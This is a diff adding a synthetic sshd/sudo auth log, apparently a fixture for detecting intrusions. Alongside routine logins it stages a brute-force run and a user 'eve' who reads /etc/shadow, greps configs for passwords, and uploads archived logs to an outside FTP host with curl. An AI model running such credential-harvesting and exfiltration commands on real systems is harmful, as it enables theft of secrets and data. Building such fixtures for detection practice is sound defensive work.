@@ -1,0 +1,40 @@
+Jun 15 08:24:35 server-1 sshd[1234]: Accepted publickey for alice from 192.168.1.100 port 43210 ssh2
+Jun 15 08:25:12 server-1 sudo[1235]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Jun 15 08:26:01 server-1 sudo[1236]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Jun 15 09:32:15 server-1 sshd[1241]: Accepted publickey for bob from 192.168.1.101 port 45678 ssh2
+Jun 15 09:33:45 server-1 sudo[1242]: bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/ls -la /var/log
+Jun 15 11:42:31 server-1 sshd[1255]: Failed password for invalid user admin from 203.0.113.100 port 50922 ssh2
+Jun 15 11:42:35 server-1 sshd[1256]: Failed password for invalid user admin from 203.0.113.100 port 50923 ssh2
+Jun 15 11:42:39 server-1 sshd[1257]: Failed password for invalid user admin from 203.0.113.100 port 50924 ssh2
+Jun 15 11:42:43 server-1 sshd[1258]: Failed password for invalid user admin from 203.0.113.100 port 50925 ssh2
+Jun 15 11:42:47 server-1 sshd[1259]: Failed password for invalid user admin from 203.0.113.100 port 50926 ssh2
+Jun 15 11:42:51 server-1 sshd[1260]: Failed password for invalid user root from 203.0.113.100 port 50927 ssh2
+Jun 15 11:42:55 server-1 sshd[1261]: Failed password for invalid user root from 203.0.113.100 port 50928 ssh2
+Jun 15 11:42:59 server-1 sshd[1262]: Failed password for invalid user root from 203.0.113.100 port 50929 ssh2
+Jun 15 11:43:03 server-1 sshd[1263]: Failed password for invalid user root from 203.0.113.100 port 50930 ssh2
+Jun 15 11:43:07 server-1 sshd[1264]: Failed password for invalid user root from 203.0.113.100 port 50931 ssh2
+Jun 15 14:15:23 server-1 sshd[1280]: Accepted publickey for carol from 192.168.1.102 port 57890 ssh2
+Jun 15 14:16:45 server-1 sudo[1281]: carol : TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/nano /etc/ssh/sshd_config
+Jun 15 14:20:12 server-1 sshd[1282]: Disconnected from user carol 192.168.1.102 port 57890
+Jun 15 14:30:45 server-1 sshd[1283]: Accepted publickey for sysadmin from 192.168.1.103 port 54321 ssh2
+Jun 15 14:31:12 server-1 sudo[1284]: sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/systemctl restart sshd
+Jun 15 17:22:43 server-1 sshd[1290]: Accepted publickey for dave from 192.168.1.104 port 38765 ssh2
+Jun 15 17:23:18 server-1 sudo[1291]: dave : TTY=pts/3 ; PWD=/home/dave ; USER=root ; COMMAND=/bin/cat /var/log/auth.log
+Jun 15 17:25:42 server-1 sshd[1292]: Disconnected from user dave 192.168.1.104 port 38765
+Jun 15 19:47:12 server-1 sshd[1300]: Connection closed by 198.51.100.200 port 41234 [preauth]
+Jun 15 19:47:15 server-1 sshd[1301]: Connection closed by 198.51.100.200 port 41235 [preauth]
+Jun 15 19:47:18 server-1 sshd[1302]: Connection closed by 198.51.100.200 port 41236 [preauth]
+Jun 15 21:33:45 server-1 sshd[1310]: Failed password for eve from 192.168.1.105 port 60234 ssh2
+Jun 15 21:33:48 server-1 sshd[1311]: Failed password for eve from 192.168.1.105 port 60235 ssh2
+Jun 15 21:33:52 server-1 sshd[1312]: Accepted password for eve from 192.168.1.105 port 60236 ssh2
+Jun 15 21:34:15 server-1 sudo[1313]: eve : TTY=pts/0 ; PWD=/home/eve ; USER=root ; COMMAND=/bin/bash
+Jun 15 21:35:02 server-1 su[1314]: Successful su for root by eve
+Jun 15 21:35:10 server-1 sudo[1315]: eve : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/find / -type f -name "*.conf" -exec grep -l "password" {} \;
+Jun 15 21:36:25 server-1 sudo[1316]: eve : TTY=pts/0 ; PWD=/etc ; USER=root ; COMMAND=/usr/bin/cat shadow
+Jun 15 21:37:30 server-1 sudo[1317]: eve : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/tar -czf /tmp/logs.tar.gz *.log
+Jun 15 21:38:15 server-1 sudo[1318]: eve : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -T logs.tar.gz ftp://198.51.100.201/logs.tar.gz
+Jun 15 21:38:45 server-1 sshd[1319]: Disconnected from user eve 192.168.1.105 port 60236
+Jun 15 23:15:45 server-1 sshd[1320]: Accepted publickey for alice from 192.168.1.100 port 43211 ssh2
+Jun 15 23:16:12 server-1 sudo[1321]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/ls -la /tmp
+Jun 15 23:16:50 server-1 sudo[1322]: alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/rm logs.tar.gz
+Jun 15 23:17:30 server-1 sudo[1323]: alice : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -n 50 auth.log 
